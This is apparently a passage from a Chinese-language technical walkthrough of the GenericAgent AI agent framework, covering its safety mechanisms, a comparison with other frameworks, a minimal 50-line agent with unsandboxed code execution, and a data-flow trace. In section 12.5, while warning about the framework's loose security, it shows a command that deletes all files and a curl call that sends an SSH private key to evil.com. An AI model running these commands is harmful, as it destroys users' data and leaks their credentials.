### 11.4 工具 schema 的语言适配

```python
def next_llm(self, n=-1):
    name = self.get_llm_name(model=True)
    if 'glm' in name or 'minimax' in name or 'kimi' in name:
        load_tool_schema('_cn')  # 中文版 schema
    else:
        load_tool_schema()       # 英文版 schema
```

对中文模型使用中文工具描述，对英文模型使用英文描述。因为工具的 `description` 会影响模型的理解和行为。

---

## 第十二章　安全边界与防御机制

### 12.1 代码执行的安全头

每次执行 Python 代码前注入的 `code_run_header.py`：

```python
# 捕获 ImportError，提示模型先安装包
sys.excepthook = lambda t, v, tb: (
    sys.__excepthook__(t, v, tb),
    print(f"\n[Agent Hint]: NO GUESSING! You MUST probe first. "
          f"If missing common package, pip.")
) if issubclass(t, (ImportError, AttributeError)) else sys.__excepthook__(t, v, tb)
```

这引导模型在遇到错误时**先探测再行动**，而不是凭猜测写代码。

### 12.2 超时保护

```python
# code_run 中的超时机制
while t.is_alive():
    if time.time() - start_t > timeout:
        process.kill()
        full_stdout.append("\n[Timeout Error] 超时强制终止")
        break
    time.sleep(1)
```

默认 60 秒超时，防止模型生成的代码陷入死循环。

### 12.3 用户中断

```python
# agentmain.py
def abort(self):
    self.stop_sig = True
    if self.handler is not None:
        self.handler.code_stop_signal.append(1)
```

用户可以随时按 Ctrl+C 中断任务。`stop_signal` 会被传递到正在执行的代码进程中。

### 12.4 不可逆操作的提醒

系统提示词中明确要求：

```
探测优先：失败时先充分获取信息（日志/状态/上下文），
关键信息存入工作记忆，再决定重试或换方案。
不可逆操作先询问用户。
```

### 12.5 代码执行的隐忧

需要承认，GenericAgent 的安全模型相对宽松——模型可以执行任意 Python 代码，包括：
- `os.system("rm -rf /")`  （删除所有文件）
- `subprocess.run(["curl", "http://evil.com", "-d", open("~/.ssh/id_rsa").read()])`（外泄密钥）

这是**能力与安全的经典权衡**：给模型越多权限，它能做的事越多，但风险也越大。

GenericAgent 的策略是：
1. 系统提示词引导模型"先探测再行动"
2. 超时保护防止失控
3. 用户可以随时中断
4. 不提供额外的沙箱隔离（这是与 OpenClaw 等平台级方案的区别）

---

## 第十三章　与其他 Agent 框架的对比

### 13.1 对比表

| 维度 | GenericAgent | LangChain | AutoGPT | OpenClaw |
|------|-------------|-----------|---------|----------|
| 核心代码量 | ~3000 行 | ~50000 行 | ~20000 行 | ~30000 行 |
| 工具数量 | 9 个原子工具 | 100+ 封装工具 | 20+ 工具 | 50+ 工具 |
| 自进化 | ✅ 自动结晶 skill | ❌ 手动注册 | ❌ 手动配置 | ❌ 手动配置 |
| 浏览器控制 | CDP 原生注入 | Selenium/Playwright | Selenium | Playwright |
| 代码执行 | subprocess 直接执行 | 受限沙箱 | 受限沙箱 | 受限沙箱 |
| 记忆系统 | 三层（工作/会话/长期） | 单层 | 单层 | 三层 |
| 部署复杂度 | 极低（pip install） | 中等 | 中等 | 高（Docker） |

### 13.2 GenericAgent 的独特优势

**1. 极简架构**

3000 行代码，一个人就能完全理解。LangChain 的抽象层多到连作者都不一定记得清每一层的作用。

**2. 自进化能力**

这是 GenericAgent 最大的差异化。其他框架的工具是固定的，而 GenericAgent 的能力会随着使用增长。

**3. Token 效率**

论文数据显示，GenericAgent 比同类框架节省约 6 倍 token。原因是：
- 没有冗余的工具描述（只有 9 个原子工具）
- 记忆压缩（早期对话被折叠）
- Skill 复用（避免重复探索）

### 13.3 GenericAgent 的局限

**1. 安全模型宽松**

模型可以执行任意代码，没有沙箱隔离。在生产环境中使用需要额外的安全措施。

**2. 单机部署**

设计目标是个人电脑上的自治助手，不是服务端的多租户系统。

**3. 依赖模型能力**

工具只有 9 个原子操作，复杂任务完全依赖模型的代码生成能力。如果模型写不出正确的代码，任务就会失败。

---

## 第十四章　从零复现一个最小 Agent

### 14.1 50 行代码的最小 Agent

理解 GenericAgent 最好的方式是自己写一个。以下是一个可以工作的最小 Agent：

```python
import json
from openai import OpenAI

client = OpenAI(api_key="your-key")

# 1. 定义工具
tools = [{
    "type": "function",
    "function": {
        "name": "run_code",
        "description": "Execute Python code",
        "parameters": {
            "type": "object",
            "properties": {
                "code": {"type": "string", "description": "Python code to execute"}
            },
            "required": ["code"]
        }
    }
}]

# 2. 工具执行函数
def run_code(code):
    import subprocess, tempfile
    f = tempfile.NamedTemporaryFile(suffix=".py", delete=False, mode='w')
    f.write(code); f.close()
    result = subprocess.run(["python3", f.name], capture_output=True, text=True, timeout=30)
    return result.stdout + result.stderr

# 3. Agent Loop
def agent_loop(user_input):
    messages = [
        {"role": "system", "content": "You are a coding assistant. Use run_code to execute code."},
        {"role": "user", "content": user_input}
    ]

    for turn in range(10):  # 最多 10 轮
        response = client.chat.completions.create(
            model="gpt-4",
            messages=messages,
            tools=tools
        )

        msg = response.choices[0].message

        # 如果模型没有调用工具，任务完成
        if not msg.tool_calls:
            print(f"Agent: {msg.content}")
            break

        # 执行工具
        for tc in msg.tool_calls:
            code = json.loads(tc.function.arguments)["code"]
            print(f"[Executing]: {code[:50]}...")
            output = run_code(code)

            # 把结果加入消息
            messages.append({"role": "assistant", "tool_calls": [tc]})
            messages.append({
                "role": "tool",
                "tool_call_id": tc.id,
                "content": output
            })

# 4. 运行
agent_loop("帮我算一下 fibonacci(20) 并保存到文件 result.txt")
```

### 14.2 这 50 行代码 vs GenericAgent

| 功能 | 最小 Agent | GenericAgent |
|------|-----------|-------------|
| Agent Loop | ✅ while 循环 | ✅ while 循环 |
| 工具定义 | ✅ JSON Schema | ✅ JSON Schema |
| 工具执行 | ✅ subprocess | ✅ subprocess |
| 工具分发 | ❌ 硬编码 if-else | ✅ 反射 dispatch |
| 流式输出 | ❌ 阻塞式 | ✅ yield 生成器 |
| 文件操作 | ❌ 只有 code_run | ✅ 专用工具 |
| 浏览器控制 | ❌ | ✅ CDP |
| 记忆系统 | ❌ | ✅ 三层 |
| 多模型支持 | ❌ 只有 OpenAI | ✅ Claude/Gemini/Kimi |
| 自进化 | ❌ | ✅ 技能结晶 |
| 超时/中断 | ❌ | ✅ 完善 |
| 错误处理 | ❌ | ✅ 模糊匹配/重试 |

最小 Agent 证明了核心原理只有 50 行。GenericAgent 的其余 2950 行都是在处理真实世界的复杂性。

---

## 附录 A　完整数据流追踪

以一个真实任务为例，追踪数据在系统中的完整流转：

**任务**：`"帮我创建一个 hello.py 文件，内容是打印当前时间"`

### 第 0 步：任务进入队列

```python
# 用户输入
agent.put_task("帮我创建一个 hello.py 文件，内容是打印当前时间")
# → 放入 self.task_queue
```

### 第 1 步：构建系统提示词

```python
sys_prompt = """
# Role: 物理级全能执行者
你拥有文件读写、脚本执行、用户浏览器JS注入、系统级干预的物理操作权限。
...
Today: 2026-05-08 Thu

[Global Memory - L2]
（之前的长期记忆内容）
"""
```

### 第 2 步：Agent Loop 第 1 轮

**发给模型的消息**：
```json
{
  "messages": [
    {"role": "system", "content": "（系统提示词）"},
    {"role": "user", "content": "帮我创建一个 hello.py 文件，内容是打印当前时间"}
  ],
  "tools": "（tools_schema.json 的内容）"
}
```

**模型返回**：
```json
{
  "content": "我来帮你创建文件。",
  "tool_calls": [{
    "function": {
      "name": "file_write",
      "arguments": "{\"path\":\"hello.py\",\"content\":\"import datetime\\nprint(datetime.datetime.now())\"}"
    }
  }]
}
```

### 第 3 步：工具分发

```python
handler.dispatch("file_write", {
    "path": "hello.py",
    "content": "import datetime\nprint(datetime.datetime.now())"
})
# → 调用 do_file_write()
# → open("hello.py", "w").write("import datetime\nprint(datetime.datetime.now())")
# → 返回 StepOutcome({"status": "success"}, next_prompt="...")
```

### 第 4 步：Agent Loop 第 2 轮

**发给模型的消息**：
```json
{
  "messages": [
    {"role": "user", "content": "（上一轮的结果）\ntool_results: [{\"status\": \"success\", \"writed_bytes\": 42}]"}
  ]
}
```

**模型返回**：
```json
{
  "content": "已创建 hello.py 文件，内容为：\n```python\nimport datetime\nprint(datetime.datetime.now())\n```\n运行 `python hello.py` 即可看到当前时间。",
  "tool_calls": null
}
```

### 第 5 步：任务完成

`tool_calls` 为空 → `no_tool` → `next_prompt=None` → 循环结束。

用户看到最终回复。

---

## 附录 B　关键源码索引

| 文件 | 行数 | 核心功能 | 关键函数/类 |
|------|------|---------|------------|
| `agent_loop.py` | ~150 | Agent Loop 循环引擎 | `agent_runner_loop()`, `BaseHandler`, `StepOutcome` |
| `agentmain.py` | ~300 | 主入口、会话管理 | `GenericAgent` 类, `put_task()`, `run()` |
| `ga.py` | ~800 | 9 个工具的具体实现 | `GenericAgentHandler`, `code_run()`, `do_*()` |
| `TMWebDriver.py` | ~400 | 浏览器 CDP 控制 | `TMWebDriver` 类 |
| `assets/tools_schema.json` | ~100 | 工具定义（传给模型） | 9 个 function 定义 |
| `assets/sys_prompt.txt` | ~30 | 系统提示词 | 角色定义、行动原则 |
| `assets/code_run_header.py` | ~30 | 代码执行安全头 | 编码适配、错误引导 |
| `llmcore/` | ~500 | LLM API 封装 | `ToolClient`, `ClaudeSession`, `MixinSession` |

---

## 结语

GenericAgent 用 3000 行代码证明了一件事：**智能体的核心原理极其简单**——就是一个 while 循环，调 LLM API，解析 tool_calls，执行，把结果喂回去。

真正复杂的是工程细节：错误处理、记忆压缩、多模型适配、浏览器注入、自进化机制……但这些复杂性都是围绕同一个核心循环展开的。

理解了这个循环，就理解了所有 Agent 框架的本质。

```
while not done:
    response = llm.chat(messages, tools)
    if response.tool_calls:
        result = execute(response.tool_calls)
        messages.append(result)
    else:
        done = True
```

就这么简单。剩下的，都是工程。
